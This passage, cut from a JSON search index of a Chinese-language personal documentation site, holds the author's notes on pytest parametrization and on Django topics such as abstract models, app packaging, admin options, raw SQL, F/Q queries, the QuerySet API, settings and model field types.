sep='\\n')\n    yield k_kwargs\n    print('end') 其中, request是一个特殊的fixture，它提供了有关当前测试运行上下文的信息. 传递多个普通参数, 给了几组参数就会执行几次当前测试: @pytest.mark.parametrize(\n    \"param1, param2\",   # 参数字符串, 注意, 这些参数需要在修饰的方法中定义,\n                        # 如此处的 test_r_use_params(param1, param2\n    [\n        ('p1', 'p2'),   # 第一组参数\n        ('p2', 'p3'),   # 第二组参数\n        ('p5', 'p4'),   # 第三组参数\n                        # 多组参数表示执行多次, 每次使用不同的参数\n                        # 这里三组会执行三次, 每次使用本次参数\n    ],\n    # indirect=['r_server'],  # 要传递的fixture name的list,\n                              # 指定哪些个固件使用这些参数\n)\ndef test_r_use_params(param1, param2, r_server):\n    result: dict = r_server\n    assert 'parametrize' in result\n    _a: Mark = result['parametrize']\n    assert _a.args == ('param1, param2', [('p1', 'p2'), ('p2', 'p3'), ('p5', 'p4')]) 这里原本想用 indirect 来指定固件, 不知道为什么使用 indirect 会导致找不到固件而执行失败, 所以放弃. 传递关键字参数: # 这里表示传递给 r_server 关键字参数\n# 这里实际传入的是: 'name': Mark(name='name', *args, **kwargs)\n@pytest.mark.key_word_one('1')\n@pytest.mark.key_word_two('2')\ndef test_r_use_keywords(r_server):\n    result: dict = r_server\n\n    assert 'key_word_one' in result\n    assert type(_a := result['key_word_one']) == Mark and _a.args[0] == '1'\n\n    assert 'key_word_two' in result\n    assert type(_a := result['key_word_two']) == Mark and _a.args[0] == '2' 可以看出, 不论是关键字参数还是普通参数, 其实都会被 Mark 修饰, 存储到 request.keywords 内.","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Pytest.html","loc":"/yq-docs-rear-end-python-Tutorial-Pytest.html"},{"title":"多个目录下的三方包整合","text":"有以下方式 将路径直接添加到sys.path 将路径加入到环境变量 PYTHONPATH 在当前三方包路径下创建一个 .pth 后缀的文件, 然后将路径按行写入 详见: 将文件夹加入到sys.path","tags":"后端; python","url":"/yq-docs-rear-end-python-Tutorial-Three--party-package-integration-in-multiple-directory.html","loc":"/yq-docs-rear-end-python-Tutorial-Three--party-package-integration-in-multiple-directory.html"},{"title":"抽象基类-定义公共字段","text":"抽象基类在你要将公共信息放入很多模型时会很有用。\n编写你的基类，并在 Meta 类中填入 abstract=True .\n该模型将不会创建任何数据表。当其用作其它模型类的基类时，它的字段会自动添加至子类。 如: from django.db import models\n\nclass CommonInfo(models.Model):\n    name = models.CharField(max_length=100)\n    age = models.PositiveIntegerField()\n\n    class Meta:\n        abstract = True\n\nclass Student(CommonInfo):\n    home_group = models.CharField(max_length=5) Student 模型拥有3个字段： name ， age 和 home_group 。 CommonInfo 模型不能用作普通的 Django 模型，\n因为它是一个抽象基类。它不会生成数据表，也没有管理器，也不能被实例化和保存。 从抽象基类继承来的字段可被其它字段或值重写，或用 None 删除。 对很多用户来说，这种继承可能就是你想要的。它提供了一种在 Python 级抽出公共信息的方法，但仍会在子类模型中创建数据表。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Abstract-base.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Abstract-base.html"},{"title":"应用打包","text":"使用 setuptools 打包 建立一个文件夹放模块 将模块目录移入这个新建的目录 在新建目录下创建一个 README.rst 文件， 包含以下内容: rst\n=====\nPolls\n=====\n\nPolls is a Django app to conduct Web-based polls. For each question,\nvisitors can choose between a fixed number of answers.\n\nDetailed documentation is in the \"docs\" directory.\n\nQuick start\n-----------\n\n1. Add \"polls\" to your INSTALLED_APPS setting like this::\n\n    INSTALLED_APPS = [\n        ...\n        'polls',\n    ]\n\n2. Include the polls URLconf in your project urls.py like this::\n\n    path('polls/', include('polls.urls')),\n\n3. Run ``python manage.py migrate`` to create the polls models.\n\n4. Start the development server and visit http://127.0.0.1:8000/admin/\n  to create a poll (you'll need the Admin app enabled).\n\n5. Visit http://127.0.0.1:8000/polls/ to participate in the poll. 在同一目录下创建 LICENSE 文件。选择一个授权协议（这里暂时不知道怎么搞） 创建 setup.cfg 和 setup.py 说明构建与安装的细节。可参考 setuptools docs 大致包含以下内容 setup.cfg: [metadata]\nname = django-polls\nversion = 0.1\ndescription = A Django app to conduct Web-based polls.\nlong_description = file: README.rst\nurl = https://www.example.com/\nauthor = Your Name\nauthor_email = yourname@example.com\nlicense = BSD-3-Clause  # Example license\nclassifiers =\n    Environment :: Web Environment\n    Framework :: Django\n    Framework :: Django :: X.Y  # Replace \"X.Y\" as appropriate\n    Intended Audience :: Developers\n    License :: OSI Approved :: BSD License\n    Operating System :: OS Independent\n    Programming Language :: Python\n    Programming Language :: Python :: 3\n    Programming Language :: Python :: 3 :: Only\n    Programming Language :: Python :: 3.6\n    Programming Language :: Python :: 3.7\n    Programming Language :: Python :: 3.8\n    Topic :: Internet :: WWW/HTTP\n    Topic :: Internet :: WWW/HTTP :: Dynamic Content\n\n[options]\ninclude_package_data = true\npackages = find:\npython_requires = >=3.6\ninstall_requires =\n    Django >= X.Y  # Replace \"X.Y\" as appropriate setup.py: from setuptools import setup\nsetup() 默认情况，包中仅包含 Python 模块和包。\n要包含其他文件，我们需要创建一个`MANIFEST.in` 文件。\n上一步中提到的 setuptools 文档更详细地讨论了这个文件。\n要包含模板、 README.rst 和我们的 LICENSE 文件，创建一个文件 MANIFEST.in ，其内容如下: include LICENSE\ninclude README.rst\nrecursive-include polls/static *\nrecursive-include polls/templates * 在应用中包含详细文档是可选的，但我们推荐你这样做。新建目录下创建一个空目录 docs 用于未来编写文档。\n额外添加一行至 MANIFEST.in : recursive-include docs * 注意，现在 docs 目录不会被加入你的应用包，除非你往这个目录加几个文件。\n许多 Django 应用也提供他们的在线文档通过类似 readthedocs.org 这样的网站。 试着构建你自己的应用包通过 ptyhon setup.py sdist（在  django-polls 目录内）。\n这将创建一个名为 dist 的目录并构建你自己的应用包， django-polls-0.1.tar.gz 。 更多关于打包的信息，见 Python 的 关于打包和发布项目的教程","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Apply.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Apply.html"},{"title":"后台管理模块admin","text":"这里其实对应的就是 应用中的 admin.py 常用字段 例子: from django.contrib import admin\n\nfrom .models import Question\n\n\nclass QuestionAdmin(admin.ModelAdmin):\n    fieldsets = [\n        (None,               {'fields': ['question_text']}),\n        ('Date information', {'fields': ['pub_date']}),\n    ]\n\nadmin.site.register(Question, QuestionAdmin) 可以自行设置自定义的后台表单如例所示，自定义的类需要 register 在基类之后的类中字段定义方法 fields 如: fields = ['pub_date', 'question_text'] 表示前台直接展示的字段以及顺序 主要用于新增 fieldsets 如: fieldsets = [\n        (None,               {'fields': ['question_text']}),\n        ('Date information', {'fields': ['pub_date']}),\n    ] 表示将这些字段分成几个字段集 其中每个元组中第一个元素表示这个集的标题 主要用于新增 list_display 如: list_display = ('question_text', 'pub_date') 表示在前台展示一个可视化的字段列表 主要用于表格化的展示 list_filter 如: list_filter = ['pub_date'] 表示允许在前端使用此字段的过滤选项（在侧边栏显示过滤选项） search_fields 如: search_fields = ['question_text'] 表示前端新增此字段的搜索框（后端将使用like查询） 自定义后台界面风格 通过 Django 的模板系统来修改 Django 的后台由自己驱动，且它的交互接口采用 Django 自己的模板系统。 在包含 manage.py 的工程目录内创建一个 templates 目录，放模板资源吧 在 settings.py 配置 DIRS选项 大致如下: TEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [BASE_DIR / 'templates'],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n] TEMPLATES 作用 包含所有 Django 模板引擎的配置的列表。列表中的每一项都是一个字典，包含了各个引擎的选项。 DIRS 是一个包含多个系统目录的文件列表，用于在载入 Django 模板时使用，是一个待搜索路径。 参考:: 自定义后台表单","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Background-management-module-admin.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Background-management-module-admin.html"},{"title":"创建项目","text":"命令行: django-admin startproject $项目名","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Creation-project.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Creation-project.html"},{"title":"自定义sql","text":"使用: Manager.raw(raw_query,params=(),translations=None) 如: >>> Person.objects.raw('''SELECT first AS first_name,\n...                              last AS last_name,\n...                              bd AS birth_date,\n...                              pk AS id,\n...                       FROM some_other_table''') 带参: >>> lname = 'Doe'\n>>> Person.objects.raw('SELECT * FROM myapp_person WHERE last_name = %s', [lname]) 参考: 执行原生 SQL 查询 | Django 文档 | Django (djangoproject.com)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Custom-SQL.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Custom-SQL.html"},{"title":"F Q","text":"F F支持表内部字段的比较 单下划线 例如，为了查找comments数目多于pingbacks数目的Entry，\n可以构造一个F()对象来引用pingback数目，并在查询中使用该F()对象： Entry有两个字段 number_of_comments，number_of_pingbacks: > from django.db.models import F\n> Entry.objects.filter(number_of_comments__gt=F('number_of_pingbacks'))\n> ps： 也支持加减乘除\n如：查询rating比pingback和comment数目总和要小的Entry，可以这么写: > Entry.objects.filter(rating__lt=F('number_of_comments') + F('number_of_pingbacks')) F支持跨表查询 双下划线 在F()中使用双下划线来进行跨表查询。例如，查询author的名字与blog名字相同的Entry: > Entry.objects.filter(authors__name=F('blog__name')) F，更新时用于获取原来的值 如: from django.db.models import F,Q\nmodels.UserInfo.objects.all().update(age=F(\"age\")+1) Q，用于构造复杂查询条件 应用一: models.UserInfo.objects.filter(Q(id__gt=1))\nmodels.UserInfo.objects.filter(Q(id=8) | Q(id=2))\nmodels.UserInfo.objects.filter(Q(id=8) & Q(id=2)) 应用二: q1 = Q()\nq1.connector = 'OR'\nq1.children.append(('id__gt', 1))\nq1.children.append(('id', 10))\nq1.children.append(('id', 9))\n\nq2 = Q()\nq2.connector = 'OR'\nq2.children.append(('c1', 1))\nq2.children.append(('c1', 10))\nq2.children.append(('c1', 9))\n\nq3 = Q()\nq3.connector = 'AND'\nq3.children.append(('id', 1))\nq3.children.append(('id', 2))\nq2.add(q3,'OR')\n\ncon = Q()\ncon.add(q1, 'AND')\ncon.add(q2, 'AND')\n\nmodels.UserInfo.objects.filter(con)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-FQ.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-FQ.html"},{"title":"QuerySet Api","text":"包含两个公开属性： ordered：查询时候是否有序（True/False） db：查询时使用的数据库 模型.objects的一些方法 每次执行都是返回一个新的QuerySet() 总览: module.objects.all() 获取该实例的所有信息\nmodule.objects.add() 添加\nmodule.objects.create() 创建\nmodule.objects.get()\nmodule.objects.filter(*kargs) 过滤器 返回包含指定参数的QuerySet，底层通过AND连接多个参数\nmodule.objects.exclude(*kargs)        返回不包含指定参数的QuerySet，底层是用NOT()包裹的AND\nmodule.objects.annotate()     聚合查询，对QuerySet的每个对象进行注解\nmodule.objects.order_by() 排序\nmodule.objects.annotate()\nmodule.objects.alias()        对QuerySet的每个字段设置别名，相当于as（没搞懂）\nmodule.objects.select_related()       会获取外键对应的对象，在需要的时候就不用重新查询数据库了（主要用于一对多字段的查询）\nmodule.objects.prefetch_related()     多对多字段的查询（通过外键所对应实体找外键所在实体），底层使用的in\nmodule.objects.reverse()      反向查询\nmodule.objects.distinct( \\*fields )   反向查询\nmodule.objects.values()       返查询字典而不是实例\nmodule.objects.defer()        单次加载时，指定不加载指定的字段，后续是需要时再加载\nmodule.objects.only() 单次加载时，指定加载指定的字段，未指定的需要再加载\nmodule.objects.extra() 所有查询操作参考: https://www.liujiangblog.com/course/django/129 module.objects.all() 获取该实例的所有信息 注意: Entry.objects.filter(pub_date__year=2006) 等价于: Entry.objects.all().filter(pub_date__year=2006) module.objects.add() 添加 module.objects.create() 创建 module.objects.get() 获取 module.objects.filter(*kargs) 过滤器 返回包含指定参数的QuerySet，底层通过AND连接多个参数 如果是多个filter，那么这些filter的链之间是或的关系（or） module.objects.exclude(*kargs) 返回不包含指定参数的QuerySet，底层是用NOT()包裹的AND module.objects.annotate() 聚合查询，对QuerySet的每个对象进行注解 module.objects.order_by() 排序 module.objects.alias() 对QuerySet的每个字段设置别名 好像相当于as（没搞懂） module.objects.select_related() 会获取外键对应的对象， 在需要的时候就不用重新查询数据库了（主要用于一对多字段的查询） module.objects.prefetch_related() 多对多字段的查询 (通过外键所对应实体找外键所在实体)，底层使用的in module.objects.reverse() 反向查询 module.objects.distinct(*fields ) 反向查询 module.objects.values() 反查询字典而不是实例 注意values与distinct使用会影响排序结果 module.objects.defer() 返回对象实例，指定不加载字段 单次加载时，指定不加载指定的字段，后续是需要时再加载 module.objects.only() 返回对象实例，指定加载字段 单次加载时，指定加载指定的字段，未指定的需要再加载 多个链式的only，只会以最后一个为准: > 比如:ret=Book.object.all().only('name')\n>         id始终会查,结果是queryset对象,套book对象(里面只有id与name字段)\n>         问:如果取price,发生了什么?\n>         它会再次查询数据库,对数据库造成压力 extra(select=None, where=None, params=None, tables=None, order_by=None, select_params=None) 有时候，Django 查询语法本身并不能很容易地表达一个复杂的 WHERE 子句。\n对于这些边缘情况，Django 提供了 extra() QuerySet 修饰符——用于将特定的子句注入到由 QuerySet 生成的 SQL 中。 如果在 extra() 调用之后使用 values() 子句，\n则 extra() 中的 select 参数所定义的任何字段必须明确地包含在 values() 调用中。\n任何在 values() 调用之后进行的 extra() 调用将忽略其额外选择的字段。 官网文档说计划 extra将在未来废弃 filter/other 过滤后的QuerySet都是唯一的 前缀为变量或者说字段名 后缀如下： __gt : 大于 __gte : 大于等于 __lt : 小于 __lte : 小于等于 __in : 其中之一 __range : 范围 __year : 日期-年 __exact ：\"精确\"匹配（区分大小写） __iexact ：是不区分大小写的匹配项 __contains ：区分大小写的模糊查询 __icontains ：不区分大小写的模糊查询，与`contains`相对应。 __startswith ：以什么开头的模糊查询（ 区分大小写 ） __istartswith ：以什么开头的模糊查询（ 不区分大小写 ） __endswith ：以什么结尾的模糊查询（ 区分大小写 ） __iendswith ：以什么结尾的模糊查询（ 不区分大小写 ） __isnull : 是空的 __regex : 区分大小写的正则匹配 __iregex : 不区分大小写的正则匹配","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-QuerySet-API.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-QuerySet-API.html"},{"title":"settings常用字段","text":"TEMPLATES 默认： [] （空列表） 一个包含所有 Django 模板引擎的配置的列表。列表中的每一项都是一个字典，包含了各个引擎的选项。 下面是一个配置，告诉 Django 模板引擎从每个安装好的应用程序中的 templates 子目录中加载模板: TEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'APP_DIRS': True,\n    },\n] 以下选项适用于所有后端。 BACKEND 默认：未定义 要使用的模板后端。内置的模板后端有： 'django.template.backends.django.DjangoTemplates' 'django.template.backends.jinja2.Jinja2' 你可以通过将 BACKEND 设置为一个完全限定的路径（例如 'mypackage.whatever.Backend' ）来使用一个不在 Django 中的模板后端。 NAME 默认：见下方 这个特定模板引擎的别称。它是一个标识符，允许选择一个引擎进行渲染。所有配置的模板引擎的别名必须是唯一的。 它默认为定义引擎类的模块名称，即 BACKEND 的下一个到最后一个，如果没有提供的话。例如，如果后端是 'mypackage.whatever.Backend' ，那么它的默认名称是 'whatever' 。 DIRS 默认： [] （空列表） 按照搜索顺序，引擎应该查找模板源文件的目录。 APP_DIRS 默认： False 引擎是否应该在已安装的应用程序中查找模板源文件。 注解 默认的 settings.py 文件由 django-admin startproject 创建，设置 'APP_DIRS': True 。 OPTIONS 默认值： {} （空字典） 要传递给模板后台的额外参数。根据模板后端的不同，可用的参数也不同。\n参见 DjangoTemplates 和 Jinja2 了解内置后端的选项 参考: setting配置","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Settings-commonly-used-field.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Settings-commonly-used-field.html"},{"title":"AutoField","text":"一个 IntegerField，根据可用的 ID 自动递增。你通常不需要直接使用它；如果你没有指定，主键字段会自动添加到你的模型中。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Autofield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Autofield.html"},{"title":"BigAutoField","text":"一个 64 位整数，与 AutoField 很相似，但保证适合 1 到 9223372036854775807 的数字。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigautofield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigautofield.html"},{"title":"BigIntegerField","text":"一个 64 位的整数，和 IntegerField 很像，只是它保证适合从 -9223372036854775808 到 9223372036854775807 的数字。该字段的默认表单部件是一个 NumberInput。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigintegerfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigintegerfield.html"},{"title":"BinaryField","text":"一个用于存储原始二进制数据的字段。可以指定为 bytes、bytearray 或 memoryview。 默认情况下，BinaryField 将 ediditable` 设置为 False，在这种情况下，它不能被包含在 ModelForm 中。 BinaryField 有一个额外的可选参数： BinaryField.max_length The maximum length (in bytes) of the field. The maximum length is enforced in Django's validation using MaxLengthValidator. 滥用 BinaryField 虽然你可能会想到在数据库中存储文件，但考虑到这在99%的情况下是糟糕的设计。这个字段 不能 代替正确的 静态文件 处理。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Binaryfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Binaryfield.html"},{"title":"BooleanField","text":"一个 true／false 字段。 该字段的默认表单部件是 CheckboxInput，或者如果 null=True 则是 NullBooleanSelect。 当 Field.default 没有定义时，BooleanField 的默认值是 None。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Booleanfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Booleanfield.html"},{"title":"DateField","text":"一个日期，在 Python 中用一个 datetime.date 实例表示。有一些额外的、可选的参数。 DateField.auto_now 每次保存对象时，自动将该字段设置为现在。\n对于\"最后修改\"的时间戳很有用。请注意，当前日期 总是 被使用，而不仅仅是一个你可以覆盖的默认值。 只有在调用 Model.save() 时，该字段才会自动更新。\n当以其他方式对其他字段进行更新时，如 QuerySet.update()，\n该字段不会被更新，尽管你可以在这样的更新中为该字段指定一个自定义值。 DateField.auto_now_add 当第一次创建对象时，自动将该字段设置为现在。\n对创建时间戳很有用。请注意，当前日期是 始终 使用的；\n它不是一个你可以覆盖的默认值。因此，即使你在创建对象时为该字段设置了一个值，它也会被忽略。\n如果你想修改这个字段，可以设置以下内容来代替 auto_now_add=True ： 对于 DateField: default=date.today ——来自 datetime.date.today() 对于 DateTimeField: default=timezone.now ——来自 django.utils.timezone.now() 该字段的默认表单部件是一个 DateInput。管理中增加了一个 JavaScript 日历，\n以及\"今天\"的快捷方式。包含一个额外的 invalid_date 错误信息键。 auto_now_add、auto_now 和 default 选项是相互排斥的。这些选项的任何组合都会导致错误。 注解 目前，将 auto_now 或 auto_now_add 设置为 True，将导致该字段设置为 editable=False 和 blank=True。 auto_now 和 auto_now_add 选项将始终使用创建或更新时 默认时区 的日期。\n如果你需要一些不同的东西，你可能需要考虑使用你自己的可调用的默认值，或者覆盖 save()\n而不是使用 auto_now 或 auto_now_add ；\n或者使用 DateTimeField 而不是 DateField，并决定如何在显示时间处理从日期时间到日期的转换。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Datefield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Datefield.html"},{"title":"DateTimeField","text":"一个日期和时间，在 Python 中用一个 datetime.datetime 实例表示。与 DateField 一样，使用相同的额外参数: class DateTimeField(auto_now=False, auto_now_add=False, \\*\\*options) 该字段的默认表单部件是一个单独的 DateTimeInput。管理中使用两个单独的 TextInput 部件，并使用 JavaScript 快捷方式。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Datetimefield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Datetimefield.html"},{"title":"DecimalField","text":"一个固定精度的十进制数，在 Python 中用一个 Decimal 实例来表示。它使用 DecimalValidator 验证输入: class DecimalField(max_digits=None, decimal_places=None, **options) 有两个 必要的 参数： DecimalField.max_digits 数字中允许的最大位数。请注意，这个数字必须大于或等于 decimal_places。 DecimalField.decimal_places 与数字一起存储的小数位数。 例如，如果要存储精度为小数点后两位的 999 的数字，你可以使用: models.DecimalField(..., max_digits=5, decimal_places=2) 并以 10 位小数的精度来存储最多约 10 亿的数字: models.DecimalField(..., max_digits=19, decimal_places=10) 当 localize 为 False 时是 NumberInput 否则，该字段的默认表单部件是 TextInput。 注解 关于 FloatField 和 DecimalField 类之间差异的更多信息，请参见 FloatField vs. DecimalField。你还应该注意小数字段的 SQLite 限制。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Decimalfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Decimalfield.html"},{"title":"DurationField","text":"一个用于存储时间段的字段——在 Python 中用 timedelta 建模。\n当在 PostgreSQL 上使用时，使用的数据类型是 interval，\n在 Oracle 上使用的数据类型是 INTERVAL DAY(9) TO SECOND(6)。否则使用微秒的 bigint: class DurationField(**options) 注解 DurationField 的算术在大多数情况下是可行的。\n但在 PostgreSQL 以外的所有数据库中，将 DurationField 的值与 DateTimeField 实例上的算术进行比较，将无法达到预期的效果。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-DurationField.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-DurationField.html"},{"title":"EmailField","text":"一个 CharField，使用 EmailValidator 来检查该值是否为有效的电子邮件地址: class EmailField(max_length=254, **options)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Emailfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Emailfield.html"},{"title":"FileField","text":"一个文件上传字段: class FileField(upload_to=None, max_length=100, \\*\\*options) 注解 primary_key 参数不支持，如果使用，会引起错误。 有两个可选参数： FileField.upload_to 这个属性提供了一种设置上传目录和文件名的方式，可以有两种设置方式。在这两种情况下，值都会传递给 Storage.save() 方法。 如果你指定一个字符串值或一个 Path，它可能包含 strftime() 格式，\n它将被文件上传的日期／时间所代替（这样上传的文件就不会填满指定的目录）。例如: class MyModel(models.Model):\n    # file will be uploaded to MEDIA_ROOT/uploads\n    upload = models.FileField(upload_to='uploads/')\n    # or...\n    # file will be saved to MEDIA_ROOT/uploads/2015/01/30\n    upload = models.FileField(upload_to='uploads/%Y/%m/%d/') 如果你使用的是默认的 FileSystemStorage，这个字符串的值将被附加到你的 MEDIA_ROOT 路径后面，\n形成本地文件系统中上传文件的存储位置。\n如果你使用的是不同的存储系统，请检查该存储系统的文档，看看它是如何处理 upload_to 的。 upload_to 也可以是一个可调用对象，如函数。这个函数将被调用以获得上传路径，包括文件名。\n这个可调用对象必须接受两个参数，并返回一个 Unix 风格的路径（带斜线），以便传给存储系统。这两个参数是： instance 定义 FileField 的模型实例。更具体地说，这是附加当前文件的特定实例。 在大多数情况下，这个对象还没有被保存到数据库，所以如果它使用默认的 AutoField，它的主键字段可能还没有一个值。 filename 最初给文件的文件名。在确定最终目标路径时，可能会考虑到，也可能不会考虑到。 例子: def user_directory_path(instance, filename):\n    # file will be uploaded to MEDIA_ROOT/user_<id>/<filename>\n    return 'user_{0}/{1}'.format(instance.user.id, filename)\n\nclass MyModel(models.Model):\n    upload = models.FileField(upload_to=user_directory_path) FileField.storage 一个存储对象，或是一个返回存储对象的可调用对象。它处理你的文件的存储和检索。参见 管理文件，了解如何提供这个对象。 Changed in Django 3.1: 增加了提供可调用对象的能力。 该字段的默认表单部件是一个 ClearableFileInput。 在模型中使用 FileField 或 ImageField （见下文）需要几个步骤： 在你的配置文件中，你需要定义 MEDIA_ROOT 作为你希望 Django 存储上传文件的目录的完整路径。\n（为了保证性能，这些文件不存储在数据库中。）\n定义 MEDIA_URL 作为该目录的基本公共 URL。确保这个目录是 Web 服务器的用户账号可以写的。 将 FileField 或 ImageField 添加到你的模型中，定义 upload_to 选项，指定 MEDIA_ROOT 的子目录，用于上传文件。 所有这些将被存储在你的数据库中的是一个文件的路径（相对于 MEDIA_ROOT ）。\n你很可能要使用 Django 提供的方便的 url 属性。\n例如，如果你的 ImageField 叫做 mug_shot，你可以在模板中使用 {{ object.mug_shot.url }} 获取图片的绝对路径。 例如，你的 MEDIA_ROOT 设置为 '/home/media'，\nupload_to 设置为 'photos/%Y/%m/%d'。\nupload_to 中的 '%Y/%m/%d' 部分是 strftime() 格式化，\n'%Y' 是四位数的年，'%m' 是两位数的月，'%d' 是两位数的日。\n如果你在 2007 年 1 月 15 日上传了一个文件，它将被保存在 /home/media/photos/2007/01/15 目录下。 如果你想检索上传文件的盘上文件名，或者文件的大小，可以分别使用 name 和 size 属性；关于可用属性和方法的更多信息，\n请参见 File 类参考和 管理文件 主题指南。 注解 文件在数据库中作为保存模型的一部分，因此在模型被保存之前，不能依赖磁盘上使用的实际文件名。 上传的文件的相对 URL 可以通过 url 属性获得。内部调用底层 Storage 类的 store() 方法。 需要注意的是，无论何时处理上传的文件，你都应该密切关注你上传的文件在哪里，\n是什么类型的文件，以避免安全漏洞。对所有上传的文件进行验证，这样你才能确定文件是你认为的那样。\n例如，如果你盲目地让别人上传文件，不经过验证，就上传文件到你的 Web 服务器的文档根目录下，\n那么有人就可以上传一个 CGI 或 PHP 脚本，并通过访问它的 URL 在你的网站上执行该脚本。不要允许这种情况发生。 另外要注意的是，即使是上传的 HTML 文件，由于可以被浏览器执行（虽然不能被服务器执行），也会造成相当于 XSS 或 CSRF 攻击的安全威胁。 FileField 实例在数据库中被创建为 varchar 列，默认最大长度为 100 个字符。与其他字段一样，你可以使用 max_length 参数改变最大长度。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Filefield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Filefield.html"},{"title":"FilePathField","text":"一个 CharField，其选择仅限于文件系统中某个目录下的文件名。有一些特殊的参数，其中第一个参数是 必须的: class FilePathField(path='', match=None, recursive=False, allow_files=True, allow_folders=False, max_length=100,\\ *\\*options) FilePathField.path 必须的。一个目录的绝对文件系统路径，这个 FilePathField 应从该目录中获取其选择。例如：\"/home/images\"。 path 也可以是一个可调用对象，可以是在运行时动态设置路径的函数。例如: import os\nfrom django.conf import settings\nfrom django.db import models\n\ndef images_path():\n    return os.path.join(settings.LOCAL_FILE_DIR, 'images')\n\nclass MyModel(models.Model):\n    file = models.FilePathField(path=images_path) FilePathField.matc 可选。一个正则表达式，作为一个字符串， FilePathField 将用于过滤文件名。\n请注意，正则表达式将被应用于基本文件名，而不是完整的路径。例如：\"foo.*.txt$\"，它将匹配名为 foo23.txt 的文件，但不匹配 bar.txt 或 foo23.png。 FilePathField.recursive 可选。True 或 False。默认为 False。指定是否包含 path 的所有子目录。 FilePathField.allow_files 可选。 True 或 False。 默认值是 True。 指定是否应该包含指定位置的文件。 这个或 allow_folders 必须是 True。 FilePathField.allow_folders 可选。 True 或 False。 默认为 False。 指定是否应该包含指定位置的文件夹。 这个或 allow_files 必须是 True。 一个潜在的问题是 match 适用于基本文件名，而不是完整的路径。所以，这个例子: FilePathField(path=\"/home/images\", match=\"foo.*\", recursive=True) 将匹配 /home/images/foo.png，但不匹配 /home/images/foo/bar.png，因为 match 适用于基本文件名（ foo.png 和 bar.png ）。 FilePathField 实例在数据库中作为 varchar 列创建，默认最大长度为 100 个字符。\n与其他字段一样，你可以使用 max_length 参数改变最大长度。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Filepathfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Filepathfield.html"},{"title":"FloatField","text":"在 Python 中用一个 float 实例表示的浮点数: class FloatField(**options) 当 localize 为 False 时是 NumberInput 否则，该字段的默认表单部件是 TextInput。 FloatField vs. DecimalField FloatField 类有时会与 DecimalField 类混淆。\n虽然它们都表示实数，但它们表示的方式不同。\nFloatField 内部使用 Python 的 float 类型，\n而 DecimalField 则使用 Python 的 Decimal 类型。关于两者之间的区别，请参见 Python 的 decimal 模块的文档。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Floatfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Floatfield.html"},{"title":"GenericIPAddressField","text":"IPv4 或 IPv6 地址，字符串格式（如 192.0.2.30 或 2a02:42fe::4 ）。该字段的默认表单部件是一个 TextInput: class GenericIPAddressField(protocol='both', unpack_ipv4=False, **options) IPv6 地址规范化遵循 RFC 4291#section-2.2 第 2.2 节，\n包括使用该节第 3 段建议的 IPv4 格式，如 ::fffff:192.0.2.0。\n例如，2001:0::0:01 将被标准化为 2001::1，::fffff:0a0a:0a0a 将被标准化为 ::fffff:10.10.10.10。所有字符都转换为小写。 GenericIPAddressField.protocol 将有效输入限制为指定协议。接受的值是 'both' （默认）、'IPv4' 或 'IPv6'。匹配是不分大小写的。 GenericIPAddressField.unpack_ipv4 解压 IPv4 映射地址，如 ::fffff:192.0.2.1。如果启用该选项，该地址将被解压为 192.0.2.1。默认为禁用。只有当 protocol 设置为 'both' 时才会启用。 